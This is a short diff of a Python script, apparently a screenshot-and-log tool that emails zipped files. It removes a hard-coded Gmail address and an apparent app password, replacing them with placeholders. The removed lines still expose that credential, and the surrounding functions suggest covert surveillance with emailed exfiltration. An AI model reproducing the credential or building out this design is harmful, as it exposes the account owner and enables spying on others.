@@ -29,8 +29,8 @@ def fullscreen_screenshot():
 def clear_log():
    os.remove("log.txt")
 def sendmail(toaddr, subject, body, filenames=[]):
-    fromaddr = "bbayir686@gmail.com"  # Gönderici e-posta adresi
-    password = "sdhd hrlf lfvg frfi"  # Gönderici e-posta hesap şifresi
+    fromaddr = "your_mail_adress"  # Gönderici e-posta adresi
+    password = "your_mail_password"  # Gönderici e-posta hesap şifresi
 
     # Ekleri zip dosyasına sıkıştır
     zip_filename = zipdosyasi(filenames)
